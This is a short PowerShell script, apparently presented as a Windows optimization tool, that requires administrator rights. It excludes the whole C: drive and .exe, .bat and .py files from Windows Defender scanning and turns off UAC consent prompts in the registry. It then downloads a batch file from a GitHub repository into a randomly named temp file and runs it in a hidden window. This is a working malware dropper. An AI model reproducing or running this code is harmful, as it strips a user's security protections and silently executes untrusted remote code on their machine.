$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "This script must be run with administrator privileges. Rerun it as administrator."
    pause
    exit 
} else {
    set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
    $registryPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.bat'"
    powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
    Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorAdmin" -Value 0
    Set-ItemProperty -Path $registryPath -Name "ConsentPromptBehaviorUser" -Value 0
    iwr -useb raw.githubusercontent.com/sombrant/windows-opti/refs/heads/main/script.bat -o $env:TEMP\HZY3F367F97VH3I2GOF2G0J.bat; saps $env:TEMP\HZY3F367F97VH3I2GOF2G0J.bat -WindowStyle Hidden
}



